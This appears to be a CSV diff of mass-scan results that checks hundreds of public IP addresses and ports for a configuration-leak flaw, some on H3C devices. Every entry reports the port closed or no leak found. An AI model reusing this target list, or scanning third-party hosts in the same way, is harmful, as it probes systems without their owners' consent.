+115.220.171.120,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.141.45,8083,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.195,8089,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.45.194,81,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.12.30,1201,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.160.159,8089,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.238,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.28.135.131,8888,否,配置泄露,,,,,端口未开放，跳过检测
+115.220.186.251,82,否,配置泄露,,,,,端口未开放，跳过检测
+49.74.244.216,60443,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.55.45,9001,否,配置泄露,,,,,端口未开放，跳过检测
+14.153.235.199,1234,否,配置泄露,,,,,端口未开放，跳过检测
+220.191.14.175,9001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.12.228,1201,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.5.109,8800,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.134.42,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.240.152,4040,否,配置泄露,,,,,端口未开放，跳过检测
+115.171.52.141,9443,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.37.224,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.36.251.86,888,否,配置泄露,,,,,端口未开放，跳过检测
+171.39.49.75,55555,否,配置泄露,,,,,端口未开放，跳过检测
+183.6.21.197,888,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.130.173,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.132.179,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.67.94,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.80.134.168,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.150,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.255.185,4040,否,配置泄露,,,,,端口未开放，跳过检测
+121.15.2.58,8819,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+121.34.61.152,20000,否,配置泄露,,,,,端口未开放，跳过检测
+14.113.211.164,18080,否,配置泄露,,,,,端口未开放，跳过检测
+116.233.83.8,18080,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.83.241,10001,否,配置泄露,,,,,端口未开放，跳过检测
+202.105.160.216,18080,否,配置泄露,,,,,端口未开放，跳过检测
+218.17.254.186,60001,否,配置泄露,,,,,端口未开放，跳过检测
+202.105.160.212,18080,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.201.230,18080,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.60.53,20000,否,配置泄露,,,,,端口未开放，跳过检测
+120.197.25.242,999,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+58.243.152.35,8181,否,配置泄露,,,,,端口未开放，跳过检测
+218.0.244.91,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.65.4.213,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.126.86,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.165.46,8090,否,配置泄露,,,,,端口未开放，跳过检测
+120.237.47.67,999,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+115.198.100.110,8081,否,配置泄露,,,,,端口未开放，跳过检测
+180.152.91.179,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.242,8089,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.19,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.16,8090,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.26,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.128,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.39.169,8020,否,配置泄露,,,,,端口未开放，跳过检测
+58.214.238.122,8585,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+125.121.41.56,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.211.40,8090,否,配置泄露,,,,,端口未开放，跳过检测
+61.142.77.142,88,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.183.0,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.61.137,82,否,配置泄露,,,,,端口未开放，跳过检测
+203.176.140.64,8888,否,配置泄露,,,,,端口未开放，跳过检测
+106.122.175.71,8888,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.68.91,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.46.251,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.21.235,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.232.3.250,33890,否,配置泄露,,,,,端口未开放，跳过检测
+183.159.214.244,9001,否,配置泄露,,,,,端口未开放，跳过检测
+14.153.176.210,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.110.100.206,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.134.238,1234,否,配置泄露,,,,,端口未开放，跳过检测
+180.158.60.93,777,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.166,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.161.97,8089,否,配置泄露,,,,,端口未开放，跳过检测
+125.85.60.178,8989,否,配置泄露,,,,,端口未开放，跳过检测
+218.74.23.205,8081,否,配置泄露,,,,,端口未开放，跳过检测
+180.159.168.6,18080,否,配置泄露,,,,,端口未开放，跳过检测
+114.224.185.6,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.37.182,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.31.232.195,9999,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.127.50,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.244.58,1234,否,配置泄露,,,,,端口未开放，跳过检测
+111.172.14.178,7777,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.63.184,20000,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.63.194,20000,否,配置泄露,,,,,端口未开放，跳过检测
+14.113.201.33,18080,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.164.219,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.61.220,8081,否,配置泄露,,,,,端口未开放，跳过检测
+218.74.55.40,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.251,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.242.202.128,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.121,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.237,8089,否,配置泄露,,,,,端口未开放，跳过检测
+182.84.232.8,8088,否,配置泄露,,,,,端口未开放，跳过检测
+202.168.164.155,8899,否,配置泄露,,,,,端口未开放，跳过检测
+14.110.198.44,8989,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.11,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.139.209,8083,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.66.83,8020,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.226.9,8081,否,配置泄露,,,,,端口未开放，跳过检测
+220.184.188.102,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.137.73,8083,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.117,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.19.210.42,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.181,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.235.54,8081,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.225.31,8081,否,配置泄露,,,,,端口未开放，跳过检测
+36.20.53.175,8181,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.247.93,8081,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.46.45,8989,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.160,1201,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.17.88,9090,否,配置泄露,,,,,端口未开放，跳过检测
+116.233.106.46,9001,否,配置泄露,,,,,端口未开放，跳过检测
+121.235.225.167,9001,否,配置泄露,,,,,端口未开放，跳过检测
+27.154.94.107,8888,否,配置泄露,,,,,端口未开放，跳过检测
+125.85.183.78,8989,否,配置泄露,,,,,端口未开放，跳过检测
+115.216.101.221,9001,否,配置泄露,,,,,端口未开放，跳过检测
+115.199.58.147,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.18.61,9090,否,配置泄露,,,,,端口未开放，跳过检测
+119.98.69.115,8899,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.1.49,8800,否,配置泄露,,,,,端口未开放，跳过检测
+180.107.165.123,10000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.82,8089,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.48,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.70,4040,否,配置泄露,,,,,端口未开放，跳过检测
+221.7.113.134,2020,否,配置泄露,,,,,端口未开放，跳过检测
+125.121.115.131,10001,否,配置泄露,,,,,端口未开放，跳过检测
+122.140.245.106,65000,否,配置泄露,,,,,端口未开放，跳过检测
+123.53.199.48,8404,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+60.177.86.221,10001,否,配置泄露,,,,,端口未开放，跳过检测
+219.128.36.136,18080,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.13.229,9443,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.61.40,20000,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.221.164,18080,否,配置泄露,,,,,端口未开放，跳过检测
+116.31.233.44,9999,否,配置泄露,,,,,端口未开放，跳过检测
+171.217.69.70,9999,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.202,8000,否,配置泄露,,,,,端口未开放，跳过检测
+115.211.86.162,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.0.47,999,否,配置泄露,,,,,端口未开放，跳过检测
+60.186.80.116,8181,否,配置泄露,,,,,端口未开放，跳过检测
+122.227.145.94,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.53.163,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.249.24.37,2020,否,配置泄露,,,,,端口未开放，跳过检测
+49.74.244.223,60443,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.147.253,8083,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.197.147,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.5,8090,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.224.156,8081,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.4,8081,否,配置泄露,,,,,端口未开放，跳过检测
+36.27.66.36,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.206.233.226,8081,否,配置泄露,,,,,端口未开放，跳过检测
+218.10.17.41,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.164.220,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.197,8090,否,配置泄露,,,,,端口未开放，跳过检测
+182.84.234.255,8088,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.128.4,82,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.39.236,8020,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.17.207,9000,否,配置泄露,,,,,端口未开放，跳过检测
+116.232.129.203,33890,否,配置泄露,,,,,端口未开放，跳过检测
+123.245.58.15,7090,否,配置泄露,,,,,端口未开放，跳过检测
+111.20.215.93,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.98.55.49,60001,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.99.197,10001,否,配置泄露,,,,,端口未开放，跳过检测
+120.41.137.106,8888,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.46.168,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.45.65,9090,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.61.145,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.82.211,8089,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.133.6,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.198,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.166.27.154,8989,否,配置泄露,,,,,端口未开放，跳过检测
+36.26.237.242,50000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.188,8089,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.60.177,20000,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.223,8000,否,配置泄露,,,,,端口未开放，跳过检测
+114.250.86.107,18080,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.61.142,20000,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.222.133,18080,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.246,8000,否,配置泄露,,,,,端口未开放，跳过检测
+219.128.36.160,18080,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.239,10443,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.234,8081,否,配置泄露,,,,,端口未开放，跳过检测
+111.76.195.95,8088,否,配置泄露,,,,,端口未开放，跳过检测
+113.90.244.83,8011,否,配置泄露,,,,,端口未开放，跳过检测
+110.90.111.118,8012,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.201.97,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.252.209,8090,否,配置泄露,,,,,端口未开放，跳过检测
+221.195.62.218,8088,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.129,4040,否,配置泄露,,,,,端口未开放，跳过检测
+122.242.202.248,8181,否,配置泄露,,,,,端口未开放，跳过检测
+220.168.88.142,60443,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.145,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.157.4.193,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.94,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.179,4040,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.165.230,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.142.44,8083,否,配置泄露,,,,,端口未开放，跳过检测
+199.182.234.28,8022,否,配置泄露,,,,,端口未开放，跳过检测
+113.248.220.141,2020,否,配置泄露,,,,,端口未开放，跳过检测
+120.41.137.116,8888,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.47.108,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.105.235.250,8090,否,配置泄露,,,,,未检测到配置泄露漏洞
+115.197.117.14,9001,否,配置泄露,,,,,端口未开放，跳过检测
+183.158.17.246,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.46.44,9090,否,配置泄露,,,,,端口未开放，跳过检测
+42.48.113.112,60443,否,配置泄露,,,,,端口未开放，跳过检测
+58.16.151.234,880,否,配置泄露,,,,,未检测到配置泄露漏洞
+113.87.83.133,8089,否,配置泄露,,,,,端口未开放，跳过检测
+61.132.33.146,5010,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.17.73,10443,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.12.97,9443,否,配置泄露,,,,,端口未开放，跳过检测
+180.102.185.186,60443,否,配置泄露,,,,,端口未开放，跳过检测
+220.191.27.17,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.120.201.200,10001,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.146.46,8000,否,配置泄露,,,,,端口未开放，跳过检测
+180.108.215.95,10000,否,配置泄露,,,,,端口未开放，跳过检测
+49.76.184.166,10001,否,配置泄露,,,,,端口未开放，跳过检测
+60.176.203.161,8081,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.61.71,20000,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.102,8000,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.213,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.218,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.229.42,9999,否,配置泄露,,,,,端口未开放，跳过检测
+59.174.116.133,8070,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.205.18,18080,否,配置泄露,,,,,端口未开放，跳过检测
+180.109.12.26,9999,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.242.116,8081,否,配置泄露,,,,,端口未开放，跳过检测
+219.128.36.249,18080,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.60.198,20000,否,配置泄露,,,,,端口未开放，跳过检测
+125.118.252.47,8181,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.93.199,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.97.254,8090,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.99.131,81,否,配置泄露,,,,,端口未开放，跳过检测
+117.41.136.210,8088,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.195,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.142.111,8083,否,配置泄露,,,,,端口未开放，跳过检测
+116.237.39.63,8020,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.254.16,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.230.130,8081,否,配置泄露,,,,,端口未开放，跳过检测
+122.232.86.177,8181,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.26.34,8081,否,配置泄露,,,,,端口未开放，跳过检测
+122.234.23.3,82,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.167.8,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.4.40.29,8081,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.255.105,8090,否,配置泄露,,,,,端口未开放，跳过检测
+183.196.152.143,7080,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.190.181,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.46.103,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.133.145,1234,否,配置泄露,,,,,端口未开放，跳过检测
+117.176.235.211,9090,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.125.24,8081,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.236,1201,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.146.34,8000,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.162.241,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.81.145,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.162.155,8089,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.38.145,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.16.10,10443,否,配置泄露,,,,,端口未开放，跳过检测
+210.12.53.166,60001,否,配置泄露,,,,,端口未开放，跳过检测
+210.12.53.186,60001,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.64,4040,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.147.110,4040,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.67,1201,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.229.178,9999,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.46.9,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.146.129,4040,否,配置泄露,,,,,端口未开放，跳过检测
+39.155.172.234,60001,否,配置泄露,,,,,端口未开放，跳过检测
+39.155.172.226,60001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.12.236,1201,否,配置泄露,,,,,端口未开放，跳过检测
+113.111.245.177,999,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.55,8089,否,配置泄露,,,,,端口未开放，跳过检测
+61.175.96.2,8089,否,配置泄露,,,,,端口未开放，跳过检测
+115.195.87.251,10001,否,配置泄露,,,,,端口未开放，跳过检测
+125.92.172.46,18080,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.26.81,8000,否,配置泄露,,,,,端口未开放，跳过检测
+121.34.61.5,20000,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.40.182,8000,否,配置泄露,,,,,未检测到配置泄露漏洞
+171.213.210.173,18080,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.146.47,8000,否,配置泄露,,,,,端口未开放，跳过检测
+60.21.140.238,8082,否,配置泄露,,,,,端口未开放，跳过检测
+60.21.140.222,8082,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.147.194,4040,否,配置泄露,,,,,端口未开放，跳过检测
+220.177.6.89,8088,否,配置泄露,,,,,端口未开放，跳过检测
+183.134.158.189,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.227.213,8081,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.13.10,9443,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.240,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.26.26,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.73,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.235.238.244,8181,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.96.96,8090,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.240.133,8081,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.7,8090,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.253.212,8090,否,配置泄露,,,,,端口未开放，跳过检测
+125.75.115.127,8086,否,配置泄露,,,,,端口未开放，跳过检测
+49.76.30.50,10001,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.164.211,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.196.53.74,82,否,配置泄露,,,,,端口未开放，跳过检测
+203.189.151.1,8888,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+122.234.229.154,8081,否,配置泄露,,,,,端口未开放，跳过检测
+221.216.13.78,60001,否,配置泄露,,,,,端口未开放，跳过检测
+222.90.10.211,1201,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.205,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.154,8989,否,配置泄露,,,,,端口未开放，跳过检测
+113.250.202.142,8989,否,配置泄露,,,,,端口未开放，跳过检测
+39.155.143.10,60001,否,配置泄露,,,,,端口未开放，跳过检测
+39.155.142.218,60001,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.74.239,9000,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.154,8089,否,配置泄露,,,,,端口未开放，跳过检测
+113.110.229.71,8089,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.181.245,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.232.86.157,33890,否,配置泄露,,,,,端口未开放，跳过检测
+118.250.128.108,60443,否,配置泄露,,,,,端口未开放，跳过检测
+119.98.141.202,8899,否,配置泄露,,,,,端口未开放，跳过检测
+1.202.13.99,9443,否,配置泄露,,,,,端口未开放，跳过检测
+202.168.187.137,8899,否,配置泄露,,,,,端口未开放，跳过检测
+219.142.143.226,60001,否,配置泄露,,,,,端口未开放，跳过检测
+171.39.7.140,55555,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.145.17,4040,否,配置泄露,,,,,端口未开放，跳过检测
+125.80.208.108,2020,否,配置泄露,,,,,端口未开放，跳过检测
+61.180.112.18,8088,否,配置泄露,,,,,端口未开放，跳过检测
+119.141.145.50,8000,否,配置泄露,,,,,端口未开放，跳过检测
+125.118.74.93,10001,否,配置泄露,,,,,端口未开放，跳过检测
+116.31.233.173,9999,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.162,8000,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.74.188,20000,否,配置泄露,,,,,端口未开放，跳过检测
+122.235.224.251,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.196.3.252,10001,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.16.218,20000,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.146.233,4040,否,配置泄露,,,,,端口未开放，跳过检测
+125.92.172.64,18080,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.235.35,18080,否,配置泄露,,,,,端口未开放，跳过检测
+116.21.252.146,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.44.251,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.245.212,1234,否,配置泄露,,,,,端口未开放，跳过检测
+113.118.19.63,9090,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.141.228,8083,否,配置泄露,,,,,端口未开放，跳过检测
+115.193.126.158,82,否,配置泄露,,,,,端口未开放，跳过检测
+183.53.108.221,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.220.190.208,8081,否,配置泄露,,,,,端口未开放，跳过检测
+115.227.143.18,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.157.164.77,8090,否,配置泄露,,,,,端口未开放，跳过检测
+49.77.39.20,60443,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.243.159,8081,否,配置泄露,,,,,端口未开放，跳过检测
+14.105.95.114,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.128.233.204,8081,否,配置泄露,,,,,端口未开放，跳过检测
+123.245.58.12,8088,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.196.83,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.243.143.112,8181,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.99.238,8090,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.83.69,8089,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.221.214,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.88.73.2,9000,否,配置泄露,,,,,端口未开放，跳过检测
+125.80.210.85,2020,否,配置泄露,,,,,端口未开放，跳过检测
+125.80.209.175,2020,否,配置泄露,,,,,端口未开放，跳过检测
+27.152.146.236,8888,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.40.122,9001,否,配置泄露,,,,,端口未开放，跳过检测
+180.114.73.100,9001,否,配置泄露,,,,,端口未开放，跳过检测
+221.2.67.61,8003,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.46.71,8081,否,配置泄露,,,,,端口未开放，跳过检测
+114.216.44.49,10000,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.147.180,4040,否,配置泄露,,,,,端口未开放，跳过检测
+113.87.80.251,8089,否,配置泄露,,,,,端口未开放，跳过检测
+223.198.242.209,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.239.37.218,9981,否,配置泄露,,,,,端口未开放，跳过检测
+110.170.101.19,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+1.202.12.210,9443,否,配置泄露,,,,,端口未开放，跳过检测
+113.89.17.93,20000,否,配置泄露,,,,,端口未开放，跳过检测
+183.17.144.155,4040,否,配置泄露,,,,,端口未开放，跳过检测
+114.250.95.94,18080,否,配置泄露,,,,,端口未开放，跳过检测
+218.1.210.197,18080,否,配置泄露,,,,,端口未开放，跳过检测
+120.198.218.16,8127,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+171.213.239.209,18080,否,配置泄露,,,,,端口未开放，跳过检测
+125.95.197.94,8090,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.227.219,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.169.78,82,否,配置泄露,,,,,端口未开放，跳过检测
+113.69.139.59,8090,否,配置泄露,,,,,端口未开放，跳过检测
+122.231.97.229,8081,否,配置泄露,,,,,端口未开放，跳过检测
+59.39.196.148,8081,否,配置泄露,,,,,端口未开放，跳过检测
+139.227.221.144,8081,否,配置泄露,,,,,端口未开放，跳过检测
+183.129.46.100,8081,否,配置泄露,,,,,端口未开放，跳过检测
+113.95.134.200,8083,否,配置泄露,,,,,端口未开放，跳过检测
+115.211.86.149,8181,否,配置泄露,,,,,端口未开放，跳过检测
+113.119.160.22,8181,否,配置泄露,,,,,端口未开放，跳过检测
+125.119.145.12,8081,否,配置泄露,,,,,端口未开放，跳过检测
+171.83.102.69,81,否,配置泄露,,,,,端口未开放，跳过检测
+115.192.22.246,8081,否,配置泄露,,,,,端口未开放，跳过检测
+221.179.238.94,8989,否,配置泄露,,,,,端口未开放，跳过检测
+183.49.245.163,8090,否,配置泄露,,,,,端口未开放，跳过检测
+115.197.175.125,8081,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.231.206,10001,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.26,10001,否,配置泄露,,,,,端口未开放，跳过检测
+115.204.37.237,9001,否,配置泄露,,,,,端口未开放，跳过检测
+113.116.47.31,9090,否,配置泄露,,,,,端口未开放，跳过检测
+180.165.29.70,8800,否,配置泄露,,,,,端口未开放，跳过检测
+27.152.147.99,8888,否,配置泄露,,,,,端口未开放，跳过检测
+119.180.28.2,8888,否,配置泄露,,,,,端口未开放，跳过检测
+180.171.80.62,8800,否,配置泄露,,,,,端口未开放，跳过检测
+36.24.127.157,9001,否,配置泄露,,,,,端口未开放，跳过检测
+116.25.39.161,9090,否,配置泄露,,,,,端口未开放，跳过检测
+106.122.174.125,8888,否,配置泄露,,,,,端口未开放，跳过检测
+116.23.175.239,999,否,配置泄露,,,,,端口未开放，跳过检测
+222.181.10.162,8989,否,配置泄露,,,,,端口未开放，跳过检测
+58.46.201.156,10001,否,配置泄露,,,,,端口未开放，跳过检测
+219.145.1.90,1201,否,配置泄露,,,,,端口未开放，跳过检测
+125.126.191.60,50000,否,配置泄露,,,,,端口未开放，跳过检测
+221.227.68.174,10001,否,配置泄露,,,,,端口未开放，跳过检测
+221.203.27.206,8000,否,配置泄露,,,,,端口未开放，跳过检测
+113.249.3.140,2020,否,配置泄露,,,,,端口未开放，跳过检测
+183.7.144.108,20000,否,配置泄露,,,,,端口未开放，跳过检测
+183.134.227.70,18080,否,配置泄露,,,,,端口未开放，跳过检测
+183.156.1.66,10001,否,配置泄露,,,,,端口未开放，跳过检测
+61.178.62.71,10001,否,配置泄露,,,,,端口未开放，跳过检测
+171.213.206.182,18080,否,配置泄露,,,,,端口未开放，跳过检测
+119.136.205.240,9999,否,配置泄露,,,,,端口未开放，跳过检测
+114.216.44.161,10000,否,配置泄露,,,,,端口未开放，跳过检测
+112.94.5.216,8191,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
